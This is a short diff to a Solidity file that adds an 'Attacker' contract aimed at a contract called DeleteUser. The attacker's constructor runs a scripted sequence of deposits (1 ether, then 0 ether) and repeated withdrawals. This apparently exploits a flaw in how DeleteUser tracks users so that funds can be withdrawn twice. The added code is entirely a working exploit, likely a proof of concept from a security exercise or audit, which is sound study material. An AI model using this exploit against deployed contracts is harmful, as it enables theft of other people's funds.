@@ -36,3 +36,16 @@ contract DeleteUser {
         if (!ok) revert CallFailed();
     }
 }
+
+contract Attacker {
+    DeleteUser victim;
+
+    constructor(DeleteUser victim_) payable {
+        victim = victim_;
+        victim.deposit{value: 1 ether}();
+        victim.deposit{value: 0 ether}();
+        victim.withdraw(1);
+        victim.deposit();
+        victim.withdraw(1);
+    }
+}
